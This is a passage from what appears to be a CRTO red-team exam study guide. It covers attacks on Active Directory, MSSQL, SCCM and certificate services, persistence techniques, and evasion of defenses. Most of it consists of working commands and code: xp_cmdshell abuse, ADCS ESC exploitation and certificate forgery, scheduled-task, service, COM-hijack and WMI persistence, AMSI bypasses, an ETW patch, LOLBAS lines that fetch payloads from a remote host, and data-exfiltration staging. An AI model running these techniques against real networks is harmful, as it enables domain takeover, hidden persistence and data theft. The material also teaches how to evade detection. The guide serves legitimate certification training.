execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:<sql-host> /m:iwhoami /i:<sql-login>
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:<sql-host> /m:ixpcmd /i:<sql-login> /c:whoami
```

```sql
-- Enable xp_cmdshell (OPSEC: changes server config)
sp_configure 'Show Advanced Options', 1; RECONFIGURE;
sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- Impersonation
EXECUTE AS login = '<sql-login>'; SELECT SYSTEM_USER;
EXECUTE AS login = '<sql-login>'; SELECT IS_SRVROLEMEMBER('sysadmin');

-- Linked servers
SELECT name, is_rpc_out_enabled FROM sys.servers;
EXEC sp_serveroption '<linked>', 'rpc out', 'true';
EXEC ('exec master..xp_cmdshell ''whoami''') AT [<linked>];
```

**OPSEC:** enabling `xp_cmdshell` and changing server options is logged and durable. `Invoke-SQLOSCmd` enables and disables it automatically — public guidance calls that better OPSEC, but it still produces config-change events.

### 12.13 Microsoft Configuration Manager (SCCM)

If SCCM is in scope, it is a high-value path: site systems, network access accounts, and client-push/admin-service lateral movement.

```text
# Enumeration (SharpSCCM ⚠)
SharpSCCM.exe local
SharpSCCM.exe get sites
SharpSCCM.exe get users
SharpSCCM.exe get naa
SharpSCCM.exe get class --class SMS_SCI_SysResUse

# Lateral movement (requires rights)
SharpSCCM.exe invoke client-push --target <host>
SharpSCCM.exe invoke admin-service --target <host>
```

**OPSEC:** SCCM traffic and logs are visible; client push creates a service/process on the target and is high-signal. Treat SCCM hosts as Tier 0.

### 12.14 OPSEC summary for domain escalation

| Action | Detection | Safer option |
|---|---|---|
| Kerberoast | 4769 RC4 | `/rc4opsec`, target few accounts |
| AS-REP roast | 4768 pre-auth off | Low volume |
| DCSync | 4662 replication GUIDs | One account, once, non-DC host |
| Golden ticket | No 4768, lifetime, RC4 | Diamond, AES, narrow SIDs |
| Silver ticket | Service-side logon | Scope to one service |
| ACL write | 5136 | Narrow right; revert |
| RBCD / shadow creds | 5136 | Remove attribute/key after |
| Skeleton key | LSASS patch | Avoid |
| GPO abuse | 5136 + SYSVOL | Revert GPO |
| Trust key dump | LSASS patch | DCSync trust object |
| LAPS read | 4662 | Only the host you need |

### 12.15 Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| `KDC_ERR_S_PRINCIPAL_UNKNOWN` | Wrong SPN/FQDN | Use `cifs/<fqdn>`; verify with `setspn` |
| `KRB_AP_ERR_SKEW` | Clock skew | Sync time with the DC |
| S4U fails | No protocol transition / wrong key | Check `userAccountControl`; use the right hash |
| DCSync access denied | Missing replication rights | Check ACLs in BloodHound; get WriteDacl first |
| Golden ticket rejected | Wrong SID/AES key, or PAC validation | Verify domain SID; use AES256; check `/sids` |
| RBCD write denied | No write on `msDS-AllowedToActOnBehalfOfOtherIdentity` | Find the ACL; use a different target |
| Kerberoast hash won't crack | AES-only / strong password | Use `-m 19700`; expand wordlist |
| Cross-domain TGS fails | SID filtering / wrong service | Request the exact SPN; check trust direction |

## 13. Active Directory Certificate Services (ADCS)

ADCS is one of the most reliable domain-escalation paths and one of the most logged. Treat every certificate request as an audit event.

> **Scope note:** the CRTO curriculum covers ADCS, but which ESC paths appear on your exam depends on the lab build. Learn ESC1, ESC3, ESC4, ESC6, ESC8, and ESC9/ESC10 at minimum, and verify the CA/template configuration in the lab.

### 13.1 Concepts

- A **CA** issues certificates. Templates define who can enrol and what the certificate can be used for.
- A certificate with **Client Authentication** EKU can be used for Kerberos PKINIT — i.e., you can turn it into a TGT with `Rubeus asktgt /certificate:`.
- The dangerous pattern is a template that lets a low-privileged user **specify the subject/SAN** (so they can ask for an admin's identity) or that is writable (so they can make it do so).
- A **forged certificate** signed by a CA private key (DPERSIST-1) is valid without any request — the persistence variant.

### 13.2 Enumeration

```text
# Certify (Windows, via Beacon)
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe cas
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /vulnerable
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /vulnerable /currentuser
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /enrolleeSuppliesSubject
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /domain:<trusted-domain>
```

```bash
# Certipy (Linux operator side)
certipy find -u <user>@<domain> -p <pass> -dc-ip <dc> -vulnerable -stdout
certipy find -u <user>@<domain> -p <pass> -dc-ip <dc> -show-admins -stdout
```

**Read the output for:** CA name, template name, enrollment rights, EKUs, `ENROLLEE_SUPPLIES_SUBJECT`, `CT_FLAG_NO_SECURITY_EXTENSION`, and whether you can write to the template or CA.

### 13.3 The ESC paths

| Path | Misconfiguration | Exploit | Noise |
|---|---|---|---|
| **ESC1** | Enrollee supplies subject + Client Auth EKU + low-priv enrol | Request a cert with `SAN=administrator` | Medium; 4886/4887 |
| **ESC2** | Any Purpose / no EKU + low-priv enrol | Same, usable for any service | Medium |
| **ESC3** | Enrollment Agent template | Enrol as agent, then request on behalf of admin | Medium |
| **ESC4** | Writable template | Modify template to ESC1, then enrol | High; 5136 + template change |
| **ESC5** | Writable CA/PKI object | Take over CA or template | High |
| **ESC6** | `EDITF_ATTRIBUTESUBJECTALTNAME2` on CA | Supply SAN in any request | Medium |
| **ESC7** | `ManageCA` / `ManageCertificates` | Approve/issue requests, add officer | High |
| **ESC8** | HTTP enrollment endpoint + NTLM | Relay DC/machine auth to `/certsrv` | High; relay |
| **ESC9** | `CT_FLAG_NO_SECURITY_EXTENSION` | Change `userPrincipalName`, request without SID extension | Medium |
| **ESC10** | Weak certificate mapping | Manipulate UPN/SID mapping | Medium |
| **ESC11** | RPC relay to CA | Relay NTLM to ICPR | High |

### 13.4 Requesting and using a certificate

#### ESC1 / ESC6 (supply a subject)

```text
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:<ca-host>\<ca-name> /template:<template> /altname:<domain>\Administrator

# Certify prints a PEM + private key. Convert to PFX on the operator side:
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

```bash
# Certipy all-in-one
certipy req -u <user>@<domain> -p <pass> -ca <ca-host>\<ca-name> -template <template> -upn administrator@<domain> -target <ca-host>
certipy auth -pfx administrator.pfx -dc-ip <dc>
```

```text
# Turn the certificate into a TGT (Rubeus)
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:Administrator /domain:<domain> /enctype:aes256 /password:<pfx-password> /certificate:<base64-pfx> /nowrap
```

#### ESC3 (enrollment agent)

```text
# 1. Request an enrollment-agent certificate
Certify.exe request /ca:<ca>\<name> /template:EnrollmentAgent

# 2. Request a certificate on behalf of an admin, using the agent cert
Certify.exe request /ca:<ca>\<name> /template:User /onbehalfof:<domain>\Administrator /enrollcert:<agent.pfx> /enrollcertpw:<pass>
```

#### ESC4 (writable template)

```bash
# Certipy can modify the template, request, and restore it
certipy template -u <user>@<domain> -p <pass> -template <template> -save-old
certipy req -u <user>@<domain> -p <pass> -ca <ca> -template <template> -upn administrator@<domain>
certipy template -u <user>@<domain> -p <pass> -template <template> -restore
```

#### ESC8 (relay)

```bash
# Relay machine/DC auth to the HTTP enrollment endpoint
certipy relay -target http://<ca-host>/certsrv/certfnsh.asp -ca <ca-host>\<ca-name> -template DomainController
# Trigger coercion (PrinterBug/PetitPotam) in parallel, then authenticate with the resulting cert
```

**OPSEC:** the CA logs requests (4886 requested, 4887 issued, 4888 denied). Template edits are 5136. Relays are visible as NTLM relay and unusual HTTP to the CA. Use the narrowest template and restore any modification.

### 13.5 Persistence: forged certificates (DPERSIST-1)

If you can extract the CA's private key (usually from the CA host, as admin/SYSTEM), you can forge certificates for any user, valid until the CA certificate expires — no further requests, no CA logs.

```text
# 1. Extract the CA certificate + private key
execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe certificates /machine
mimikatz !crypto::certificates /systemstore:local_machine /export

# 2. Convert to PFX
openssl pkcs12 -in ca.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out ca.pfx

# 3. Forge a certificate for an admin
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword <pass> --Subject "CN=User" --SubjectAltName "administrator@<domain>" --NewCertPath fake.pfx --NewCertPassword <pass>

# 4. Use it for a TGT
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:Administrator /domain:<domain> /enctype:aes256 /password:<pass> /certificate:<base64-fake-pfx> /nowrap
```

**OPSEC:** no CA request is logged (the certificate is forged), but the TGT request and the use of a certificate whose serial is not in the CA database can be anomalous. This is a persistence technique — use it only when persistence is part of the objective, and clean up the exported keys.

### 13.6 ADCS troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| `Certify find` shows nothing | No LDAP access / wrong CA | Use `-domain` / alternate creds; check `cas` |
| Request denied | Enrolment rights or approval required | Check template ACLs; ESC7 if pending |
| `CERTSRV_E_...` | Template requires approval | Use an officer account or ESC7 |
| Cert works but no TGT | Missing Client Auth EKU / wrong user | Check EKU; use `asktgt /enctype:aes256` |
| PFX import fails | Wrong password / format | Convert with OpenSSL; verify password |
| ESC8 relay fails | EPA/HTTPS enforced, or no coercion | Check endpoint; use a different coercion |

## 14. Persistence

Persistence is optional on many CRTO attempts unless the objective requires it. Every mechanism here is a durable artifact and a scored detection if left behind. **Add persistence only when the objective or a failing path requires it, and document how you will remove it.**

### 14.1 Principles

- Prefer persistence that **survives reboot** only if you need it across the exam's pause/resume boundary.
- Prefer **user-context** persistence over SYSTEM-level where it achieves the goal.
- Prefer **existing** autostart locations over new services.
- Record the exact registry key, task name, service name, or file path you created.
- Test the removal command before you need it.

### 14.2 Scheduled tasks

```text
# On-logon task running as SYSTEM
schtasks /create /tn "WindowsUpdateCheck" /tr "C:\Windows\Temp\updater.exe" /sc onlogon /ru SYSTEM /rl highest

# Every 5 minutes
schtasks /create /tn "WindowsUpdateCheck" /tr "C:\Windows\Temp\updater.exe" /sc minute /mo 5 /ru SYSTEM

# Run it now
schtasks /run /tn "WindowsUpdateCheck"

# Remove
schtasks /delete /tn "WindowsUpdateCheck" /f
```

**OPSEC:** 4698 create, 4702 modify, 4699 delete. A task named like a Windows task is less obvious, but the XML and command line are visible. Use a benign-sounding name and a quiet payload.

### 14.3 Services

```text
sc create WindowsUpdateSvc binPath= "C:\Windows\Temp\updater.exe" start= auto
sc start WindowsUpdateSvc
sc delete WindowsUpdateSvc
```

**OPSEC:** 7045 + 4697, and a new service is a high-signal detection. Avoid on Tier-0. Delete the service and binary.

### 14.4 Registry Run keys

```text
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v OneDriveSync /t REG_SZ /d "C:\Users\<user>\AppData\Roaming\updater.exe" /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v OneDriveSync /t REG_SZ /d "C:\Windows\Temp\updater.exe" /f
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v OneDriveSync /f
```

**OPSEC:** Sysmon 12/13, registry auditing. HKCU is lower-privilege and often less monitored than HKLM.

### 14.5 Startup folder

```text
copy C:\Windows\Temp\updater.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\OneDriveSync.exe"
del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\OneDriveSync.exe"
```

**OPSEC:** file-create telemetry; simple and user-context.

### 14.6 COM hijacking

A per-user COM registration in HKCU overrides the machine-wide one and loads your DLL when a legitimate application instantiates the CLSID.

```text
# Find a CLSID that is referenced but has no HKCU override (public tools: COM hijack scanners)
reg query HKLM\Software\Classes\CLSID\{<clsid>}\InprocServer32

# Add the override
reg add "HKCU\Software\Classes\CLSID\{<clsid>}\InprocServer32" /ve /d "C:\Users\<user>\AppData\Roaming\payload.dll" /f

# Remove
reg delete "HKCU\Software\Classes\CLSID\{<clsid>}" /f
```

**OPSEC:** registry telemetry; HKCU is user-scoped and survives logoff/logon. The DLL load is Sysmon 7. Requires a believable, often-signed proxy DLL.

### 14.7 WMI event subscription

```text
powershell-import C:\Tools\PowerLurk.ps1
powerpick Register-MaliciousWmiEvent -EventName Calc -PermanentCommand "C:\Windows\Temp\updater.exe" -Trigger Timer -Interval 5m
# Remove the filter/consumer/binding when done
```

**OPSEC:** Sysmon 19/20/21. High-signal; use only if explicitly needed.

### 14.8 Domain-level persistence

| Mechanism | What it does | Detection | Notes |
|---|---|---|---|
| **Golden ticket** | Forge TGTs from `krbtgt` | Anomalous TGT use | Persists until `krbtgt` rotated twice |
| **Skeleton key** | Master password on DC | LSASS patch | Lost on reboot; very loud |
| **DSRM** | Use the DSRM admin account | `DsrmAdminLogonBehavior` registry | Needs the DSRM password |
| **AdminSDHolder** | ACL applied to protected objects | 5136 | Slow (SDProp interval) |
| **SID history** | Add a privileged SID to a user | 5136 / token anomalies | Forest-dependent |
| **ACL backdoor** | Grant DCSync to a controlled user | 5136 | Easy to detect; revert |
| **Certificate** | Forged CA cert | No CA request | Valid until CA cert expires |
| **Trust key** | Forge inter-domain tickets | Trust anomalies | High impact |

```text
# DSRM
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f
# Then authenticate with the DSRM account (network logon) — credentials required
```

```text
# AdminSDHolder: grant a controlled user full control over protected objects
powerpick Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=<domain>,DC=<tld>" -PrincipalIdentity <user> -Rights All
```

**OPSEC:** every domain-level persistence method is visible in directory logs and is likely to be graded. Prefer the least invasive mechanism that satisfies the objective, and remove it.

### 14.9 Persistence OPSEC summary

| Mechanism | Event | Reversible? | Risk |
|---|---|---|---|
| Scheduled task | 4698 | Yes | Medium |
| Service | 7045/4697 | Yes | High |
| Run key | Sysmon 12/13 | Yes | Low–medium |
| Startup folder | Sysmon 11 | Yes | Low |
| COM hijack | Sysmon 12/13, 7 | Yes | Medium |
| WMI subscription | Sysmon 19/20/21 | Yes | High |
| Golden ticket | TGT anomalies | Rotate krbtgt | High |
| Skeleton key | LSASS patch | Reboot | Very high |
| DSRM | Registry | Yes | Medium |
| AdminSDHolder | 5136 | Yes | High |
| Forged cert | TGT anomalies | Revoke/expire | High |

### 14.10 Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| Task runs but nothing happens | Payload blocked / wrong arch | Test payload manually; check task history |
| Service won't start | Path/quotes/ACL | `sc qc`; run the binary manually |
| Run key ignored | User not logging on / policy | Test in the user's context |
| COM hijack doesn't load | CLSID not instantiated | Pick a CLSID the target app uses |
| WMI subscription missing | Namespace/permissions | Use root\subscription; run as admin |

## 15. Defense evasion and OPSEC deep dive

Half the exam is this section. The goal is not "bypass everything" — it is **not to generate the detections the exam is scoring**.

### 15.1 The scoring model, restated

Public candidate reports consistently describe these OPSEC categories:

| Category | What triggers it | Best mitigation |
|---|---|---|
| Blocked code execution | AppLocker/WDAC blocks a binary or script | Test payloads; use allowed paths/LOLBAS |
| Unusual process network connections | A process that should not egress makes an outbound connection | `spawnto`, redirectors, believable profile |
| Default Cobalt Strike indicators | Default profile, port, pipe, `rundll32.exe` spawn | Customise before first beacon |
| Suspicious lateral movement | Service creation, PsExec, noisy WinRM | WinRM/SMB beacons, minimal hops |
| LSASS handle access | `mimikatz`, `hashdump`, dump tools | Avoid or minimise; use other sources |
| Disabling security controls | Turning off Defender, clearing logs | Never |
| Restricted hosts | Any detection on the RoE list | Read the list; use the quietest path or skip |

### 15.2 AMSI

AMSI scans PowerShell, .NET, VBScript, and some other content before execution. `powerpick` and `execute-assembly` host the CLR in the beacon process, so AMSI can still see the content.

```text
# Cobalt Strike kit command (covers powerpick, execute-assembly, psinject — NOT the powershell command) ⚠
amsi_disable
```

```powershell
# Classic amsiInitFailed bypass (heavily signatured; vary it)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

```powershell
# AMSI context patch (also signatured; vary strings/obfuscation)
$a = [Ref].Assembly.GetTypes() | ? { $_.Name -like "*iUtils" }
$b = $a.GetFields('NonPublic,Static') | ? { $_.Name -like "*Context" }
$c = $b.GetValue($null)
[System.Runtime.InteropServices.Marshal]::WriteInt32($c, 0x41414141)
```

**OPSEC:** every public AMSI bypass is signatured. Prefer:
- `execute-assembly` with a tool that is not flagged, rather than a bypass.
- `blockdlls start` to keep EDR userland DLLs out of the sacrificial process.
- A custom/obfuscated bypass only if you must run a flagged script.
- `amsi_disable` where the kit provides it; remember it does **not** cover `powershell`.

### 15.3 ETW

ETW feeds many EDR detections (process, image load, .NET). Userland patching of `EtwEventWrite` can blind some consumers, but kernel callbacks and ETW Threat-Intelligence providers may still fire.

```powershell
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class ETW {
  [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr h, string p);
  [DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string n);
  [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint np, out uint op);
}
"@
$ntdll = [ETW]::LoadLibrary("ntdll.dll")
$addr  = [ETW]::GetProcAddress($ntdll, "EtwEventWrite")
$old   = 0
[ETW]::VirtualProtect($addr, [UIntPtr]1, 0x40, [ref]$old) | Out-Null
[System.Runtime.InteropServices.Marshal]::WriteByte($addr, 0xC3)   # ret
```

**OPSEC:** patching ETW is itself a detection on a monitored host. Do not do it on Tier 0. Prefer not to generate the event in the first place.

### 15.4 AppLocker and WDAC

```text
powershell Get-AppLockerPolicy -Effective -Xml
powershell Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
powershell Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2"
powershell $ExecutionContext.SessionState.LanguageMode
```

**Default AppLocker behaviour:** rules usually allow `C:\Windows` and `C:\Program Files`. `C:\Windows\Tasks` is commonly writable by users and therefore a useful path. DLL enforcement is often not enabled.

```text
# Check writable locations
powershell Get-Acl C:\Windows\Tasks | fl
powershell Get-Acl C:\Windows\Temp  | fl
icacls "C:\Windows\Tasks"
```

**LOLBAS execution (choose one that is allowed and believable):**

```text
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\Windows\Tasks\payload.csproj
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\payload.dll
C:\Windows\System32\regsvr32.exe /s /u /i:http://<host>/payload.sct scrobj.dll
C:\Windows\System32\rundll32.exe C:\Windows\Tasks\payload.dll,EntryPoint
C:\Windows\System32\mshta.exe http://<host>/payload.hta
C:\Windows\System32\forfiles.exe /p C:\Windows\System32 /m notepad.exe /c "C:\Windows\Tasks\payload.exe"
C:\Windows\System32\pcalua.exe -a C:\Windows\Tasks\payload.exe
"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --headless --disable-gpu-sandbox --gpu-launcher="C:\Windows\Tasks\payload.exe &&"
```

**Constrained Language Mode (CLM):**

```text
powershell $ExecutionContext.SessionState.LanguageMode
# ConstrainedLanguage means many PowerShell bypasses are blocked
```

CLM bypasses are version-dependent and often blocked. Prefer `execute-assembly` (.NET may run) or a non-PowerShell payload. `PSByPassCLM` / `InstallUtil`-based CLM removal ⚠ works only on some builds.

**OPSEC:** a **blocked** execution is a scored detection even if nothing runs. Check the policy before you try. Use a path the policy allows, and prefer a signed LOLBAS binary over a custom unsigned EXE.

### 15.5 Microsoft Defender

```text
powershell Get-MpComputerStatus
powershell Get-MpPreference | select DisableRealtimeMonitoring,DisableIOAVProtection,ExclusionPath,ExclusionProcess
powershell (Get-MpPreference).AttackSurfaceReductionRules_Ids
powershell (Get-MpPreference).AttackSurfaceReductionRules_Actions
```

**Key ASR rules to check**

| Rule | GUID | Effect |
|---|---|---|
| Block credential stealing from LSASS | `9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2` | Blocks Mimikatz-style access |
| Block process creations from PSExec/WMI | `d1e49aac-8f56-4280-b9ba-993a6d77406c` | Blocks psexec/WMI lateral |
| Block executable content from email/webmail | `be9ba2d9-53ea-4cdc-84e5-9b1eeee46550` | Blocks download-and-run |
| Block Office child processes | `d4f940ab-401b-4efc-aadc-ad5f3c506588` | Blocks macro execution |
| Block persistence via WMI subscription | `e6db77e5-3df2-4cf1-b95a-636979351e5b` | Blocks WMI persistence |
| Block untrusted executables from USB | `b2b3f03d-6a65-4f7b-a9c7-1c7ef74a9ba4` | — |
| Advanced ransomware protection | `c1db55ab-c21a-4637-bb3f-a12568109d35` | — |

**Do not disable Defender.** `Set-MpPreference -DisableRealtimeMonitoring $true` is likely blocked by tamper protection, and when it works it logs 5001 and is almost certainly a scored detection.

Quieter options:
- **Artifact Kit + Resource Kit** rebuilt against your profile.
- **Malleable profile** with `userwx "false"`, `cleanup "true"`, `obfuscate "true"`.
- **Sleep Mask Kit** to hide beacon memory during sleep.
- `blockdlls start` and a non-default `spawnto`.
- Stageless, obfuscated payloads; avoid known-bad hashes.
- Avoid writing tools to disk; use `execute-assembly`.

### 15.6 Process, injection, and lineage OPSEC

| Action | Detection surface | Mitigation |
|---|---|---|
| `execute-assembly` | New process, .NET image load | Use a believable `spawnto`; `blockdlls` |
| `powerpick` | CLR in beacon process | Avoid flagged scripts; AMSI |
| `inject` / `shinject` | Sysmon 8/10, image load | Inject into a suitable process, not critical ones |
| `spawn` | New process, parent lineage | Parent should make sense for the child |
| `mimikatz` | LSASS access + sacrificial process | Avoid; if used, once, then delete |
| `hashdump` | LSASS access | Prefer DPAPI/tickets |
| `getsystem` | Named pipe + token | Expected, but still telemetry |

**Rules of thumb:**
- Never inject into `lsass.exe`, `winlogon.exe`, `csrss.exe`, `services.exe`, `MsMpEng.exe`, or `svchost.exe` hosting critical services.
- A `rundll32.exe` parent that spawns `cmd.exe` or opens SMB is a classic pattern. Change `spawnto`.
- A beacon process making HTTPS to a random IP with no proxy history is a classic pattern. Use redirectors and a believable profile.
- Keep parent/child stories consistent: a browser spawning `rundll32` is odd; an installer spawning `msiexec` is normal.

### 15.7 Egress OPSEC

- Use a **redirector** or CDN in front of the team server; never expose it.
- Prefer **HTTPS/443** or **HTTP/80** with a believable Host header.
- Match the **user-agent**, URI paths, and headers to the Host header's story.
- Avoid DNS beacons unless egress demands it; DNS is slow and noisy.
- Keep the egress beacon **slow** (60s+) with jitter; spawn short-lived sessions for work.
- Do not let every host call home. Use SMB/TCP peer-to-peer.
- If a proxy is present, know whether the beacon is proxy-aware and whether direct egress is allowed.

### 15.8 Logging and cleanup

- **Do not clear event logs.** 1102 is a scored detection.
- **Do not disable logging or auditing.**
- Prefer in-memory execution; if you write a file, delete it.
- Prefer `execute-assembly`/`powerpick` over `shell`; command-line logging (4688) is enabled in most modern environments.
- PowerShell script-block logging (4104) sees content; `powerpick` does not spawn `powershell.exe` but the CLR still runs.
- Delete: payloads, dumps, tools, hives, exported certificates, staged files.
- Remove: services, scheduled tasks, firewall rules, registry keys, WMI subscriptions, ACL entries, RBCD attributes, shadow credentials, tickets/tokens, port forwards, proxies.

### 15.9 The pre-submit OPSEC checklist

Use Appendix G. The short version:

- [ ] Custom profile, non-default port, URI, user-agent, pipe, `spawnto`
- [ ] No `rundll32.exe` beacon parents left running
- [ ] No LSASS access on restricted hosts
- [ ] No services/tasks/files/firewall rules left behind
- [ ] No ACL/delegation/shadow-credential changes left in AD
- [ ] No Defender/logging changes
- [ ] No unexpected egress from odd processes
- [ ] All proxies, port forwards, and extra beacons closed

### 15.10 Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| Execution blocked, no error | AppLocker/WDAC | Check policy; use an allowed path/LOLBAS |
| AMSI blocks a script | Signature | `execute-assembly` alternative; vary bypass |
| Payload quarantined on write | Defender static | Rebuild artifact; avoid disk |
| Beacon killed after injection | EDR behavioural | Change target process/`spawnto`; `blockdlls` |
| PowerShell in CLM | Constrained mode | Use .NET assembly or non-PS payload |
| `Set-MpPreference` fails | Tamper protection | Do not fight it; evade instead |

## 16. Data hunting, exfiltration, and cleanup

### 16.1 Find the data

```text
powerpick Get-NetFileServer
powerpick Find-DomainShare -CheckShareAccess
powerpick Invoke-ShareFinder -Verbose
powerpick Invoke-FileFinder -Verbose
powerpick Find-InterestingDomainShareFile -Include *.doc*,*.xls*,*.csv,*.ppt*,*.pdf,*.txt
```

| Target | Command |
|---|---|
| Open shares | `Find-DomainShare -CheckShareAccess` |
| Files by name/type | `Find-InterestingDomainShareFile -Include ...` |
| SMB browse | `ls \\<host>\<share>` · `dir \\<host>\<share>` |
| Local user data | `dir /s /b C:\Users\<user>\Documents` |
| Databases | SQL queries (Section 16.3) |
| GPO `cpassword` | Section 16.2 |

### 16.2 SYSVOL and `cpassword`

Group Policy Preferences can store a password encrypted with a **publicly known key**. It is trivially decryptable.

```text
findstr /S /I cpassword \\<dc>\sysvol\<domain>\policies\*.xml
type \\<dc>\sysvol\<domain>\policies\<GUID>\Machine\Preferences\Groups\Groups.xml

# Decrypt (PowerSploit / PowerView)
powershell-import C:\Tools\PowerSploit\Privesc\Get-GPPPassword.ps1
powerpick Get-GPPPassword
```

```text
# Or parse the Registry.pol from a GPO
download \\<dc>\sysvol\<domain>\policies\{<GUID>}\Machine\Registry.pol
powershell-import C:\Tools\Parse-PolFile.ps1
powerpick Parse-PolFile .\Registry.pol
```

**OPSEC:** reading SYSVOL is normal domain-user activity and usually low-noise. It is one of the best quiet wins.

### 16.3 SQL data and linked servers

```text
powerpick Get-SQLQuery -Instance "<sql-host>,1433" -Query "select @@version"
powerpick Get-SQLQuery -Instance "<sql-host>,1433" -Query "select name from sys.databases"
powerpick Get-SQLQuery -Instance "<sql-host>,1433" -Query "select * from <db>.dbo.<table>"

# Through a linked server
powerpick Get-SQLQuery -Instance "<sql1>,1433" -Query "select * from openquery(""<sql2>"", 'select * from information_schema.tables')"
powerpick Get-SQLQuery -Instance "<sql1>,1433" -Query "select * from openquery(""<sql2>"", 'select * from <db>.dbo.<table>')"
```

**OPSEC:** SQL queries are logged; large result sets and `openquery` across links are visible. Pull only what you need.

### 16.4 Staging and transfer

```text
# Beacon-native
download C:\Users\<user>\Desktop\evidence.zip
upload C:\Tools\tool.exe C:\Windows\Temp\tool.exe

# Small text output
powerpick gc \\<host>\<share>\file.csv | select -first 20

# Base64 for binary-safe transfer through a shell
certutil -encode C:\Windows\Temp\data.zip C:\Windows\Temp\data.b64
type C:\Windows\Temp\data.b64
```

**OPSEC:** every download is a file read/transfer; large transfers are noticeable. Compress and encrypt if the data is sensitive, and delete staged copies.

### 16.5 Cleanup

Run this before submitting. Public candidate reports show cleanup directly affects the OPSEC half.

```text
# Files
del C:\Windows\Temp\payload.exe
del C:\Windows\Temp\sam.hiv C:\Windows\Temp\system.hiv C:\Windows\Temp\security.hiv

# Services
sc stop <service>
sc delete <service>

# Scheduled tasks
schtasks /delete /tn "<task>" /f

# Registry persistence
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v <name> /f

# COM hijack
reg delete "HKCU\Software\Classes\CLSID\{<clsid>}" /f

# Firewall rules
powershell Remove-NetFirewallRule -DisplayName "8080-In"

# Tunnels and sessions
rportfwd stop 8080
socks stop
unlink
jobkill <id>
```

**Directory cleanup (if you changed AD):**

```text
# Remove an ACL you added
powerpick Remove-DomainObjectAcl -TargetIdentity <target> -PrincipalIdentity <user> -Rights <right>

# Remove RBCD
powerpick Set-ADComputer -Identity <target> -PrincipalsAllowedToDelegateToAccount $null

# Remove shadow credentials
# Whisker clear /target:<target> /domain:<domain> /dc:<dc>

# Restore a GPO change
powerpick Remove-GPLink -Name "Evil GPO" -Target "OU=...,DC=..."
powerpick Remove-GPO -Name "Evil GPO"

# Restore a service binPath
sc config <service> binPath= "<original>"
```

**Do not:**
- Clear event logs.
- Delete logs or auditing policy.
- Leave golden tickets, skeleton keys, or DSRM changes in place unless persistence is the objective.
- Leave a beacon calling home after you finish.

### 16.6 Reporting (if your format requires it)

The current public reports describe no written report, but older formats and some retakes may require one. Keep a skeleton ready:

```text
1. Executive summary — objective, outcome, risk
2. Scope and RoE — hosts, restrictions, time
3. Attack narrative — foothold → privilege → lateral → objective
4. Evidence — screenshots, command output, timestamps
5. OPSEC notes — what each action left behind, what you cleaned
6. Findings and remediation — misconfigurations, detections, recommendations
7. Appendix — credentials/tickets used (redacted), tools, IOCs
```

Even without a report, keep the **action log**. It is your cleanup checklist and your OPSEC defence.

### 16.7 Final checklist

- [ ] Objective achieved and verified
- [ ] Action log complete (time, host, action, artifact)
- [ ] All payloads/tools/dumps/hives/certs deleted
- [ ] All services/tasks/registry keys/firewall rules removed
- [ ] All ACL/RBCD/shadow-credential/GPO changes reverted
- [ ] All extra beacons, SOCKS proxies, port forwards, tunnels closed
- [ ] No Defender/logging changes
- [ ] No beacon parented by `rundll32.exe` left running
- [ ] No restricted hosts with unexplained detections
- [ ] Pause/submit only after a final read of the RoE

# Part III — Appendices

## Appendix A — Beacon command reference

Syntax is Cobalt Strike Beacon (4.x). Commands marked ⚠ depend on the build or an installed kit/BOF.

### Session and control

| Command | Does | OPSEC |
|---|---|---|
| `sleep <seconds> [jitter%]` | Set check-in interval | Longer + jitter = quieter |
| `checkin` | Force an immediate check-in | Extra traffic; use sparingly |
| `getuid` | Current token user | 🟢 |
| `whoami` | Current user (alias) | 🟢 |
| `rev2self` | Drop impersonation | Do it after token work |
